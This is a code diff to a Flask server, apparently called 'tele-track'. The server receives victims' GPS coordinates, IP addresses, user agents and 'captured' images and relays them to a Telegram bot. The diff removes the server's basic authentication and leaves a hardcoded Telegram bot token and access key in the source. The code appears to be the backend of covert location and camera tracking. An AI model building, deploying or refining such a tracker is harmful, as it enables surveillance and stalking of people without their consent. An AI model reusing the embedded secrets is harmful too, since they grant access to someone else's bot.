@@ -197,7 +197,6 @@
 # https://tele-track-syk8.onrender.com
 
 from flask import Flask, request, jsonify, send_file
-from flask_httpauth import HTTPBasicAuth
 from datetime import datetime
 import os
 import traceback
@@ -209,12 +208,6 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 
 # -------------------- Flask Setup --------------------
 app = Flask(__name__)
-auth = HTTPBasicAuth()
-users = {"admin": "pass123"}
-
-@auth.verify_password
-def verify_password(username, password):
-    return username if username in users and users[username] == password else None
 
 # -------------------- Folder Setup --------------------
 SAVE_FOLDER = "saved_files"
@@ -223,7 +216,7 @@ os.makedirs(SAVE_FOLDER, exist_ok=True)
 # -------------------- Telegram Bot Setup --------------------
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0")
 AUTHORIZED_KEY = os.environ.get("AUTHORIZED_KEY", "ztrack577802")
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://tele-track-uefk.onrender.com/webhook")
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://tele-track-syk8.onrender.com/webhook")
 
 authenticated_users = set()
 
@@ -267,7 +260,6 @@ async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) from saved_files.")
 
-# Register handlers
 application.add_handler(CommandHandler("start", start))
 application.add_handler(CommandHandler("auth", auth))
 application.add_handler(CommandHandler("chatid", chatid))
@@ -277,7 +269,7 @@ application.add_handler(CommandHandler("delete", delete))
 def send_telegram_message(message):
     for user_id in authenticated_users:
         try:
-            bot.send_message(chat_id=user_id, text=message, parse_mode="Markdown")
+            asyncio.run(bot.send_message(chat_id=user_id, text=message, parse_mode="Markdown"))
         except Exception as e:
             print("❌ Telegram message error:", e)
 
@@ -285,7 +277,7 @@ def send_telegram_image(filepath, caption=""):
     for user_id in authenticated_users:
         try:
             with open(filepath, "rb") as photo:
-                bot.send_photo(chat_id=user_id, photo=photo, caption=caption)
+                asyncio.run(bot.send_photo(chat_id=user_id, photo=photo, caption=caption))
         except Exception as e:
             print("❌ Telegram image error:", e)
 
@@ -302,11 +294,11 @@ def receive_location():
         user_agent = request.headers.get('User-Agent')
 
         msg = (
-            "📍 *New Location Received:*\n"
+            "\U0001F4CD *New Location Received:*\n"
             f"Latitude: `{data['latitude']}`\n"
             f"Longitude: `{data['longitude']}`\n"
             f"Accuracy: ±{data['accuracy']} m\n"
-            f"[📍 View on Map](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
+            f"[\U0001F4CD View on Map](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
             f"IP: `{ip_address}`\n"
             f"UA: `{user_agent}`"
         )
@@ -328,7 +320,7 @@ def upload_image():
         filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
         image_file.save(filename)
 
-        send_telegram_image(filename, caption="🖼️ New Image Captured")
+        send_telegram_image(filename, caption="\U0001F5BC️ New Image Captured")
         return jsonify({"status": "OK"}), 200
     except Exception as e:
         print("❌ Upload error:", e)
@@ -338,7 +330,6 @@ def upload_image():
 @app.route('/webhook', methods=['POST'])
 async def telegram_webhook():
     try:
-        print("📡 Webhook triggered")
         update = Update.de_json(request.get_json(force=True), bot)
         await application.process_update(update)
         return "OK", 200
@@ -347,30 +338,17 @@ async def telegram_webhook():
         traceback.print_exc()
         return "Webhook Failed", 500
 
-# # -------------------- Telegram Init on Startup --------------------
-# @app.before_first_request
-# def init_telegram_bot():
-#     print("🚀 Initializing Telegram application...")
-#     asyncio.create_task(application.initialize())
-#     asyncio.create_task(application.start())
-#     bot.set_webhook(WEBHOOK_URL)
-#     print(f"✅ Webhook set: {WEBHOOK_URL}")
-
+# -------------------- Main Startup --------------------
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    print(f"🚀 Flask running on port {port}")
+    print(f"\U0001F680 Flask running on port {port}")
 
-    # Set webhook
-    bot.delete_webhook()  # Clear old one (optional)
-    bot.set_webhook(WEBHOOK_URL)
-    print(f"✅ Webhook set to: {WEBHOOK_URL}")
-
-    # Run telegram bot initialization
-    async def init_and_run():
+    async def startup():
         await application.initialize()
         await application.start()
+        await bot.delete_webhook()
+        await bot.set_webhook(WEBHOOK_URL)
+        print(f"✅ Webhook set to: {WEBHOOK_URL}")
 
-    asyncio.get_event_loop().run_until_complete(init_and_run())
-
-    # Start Flask server
+    asyncio.get_event_loop().run_until_complete(startup())
     app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
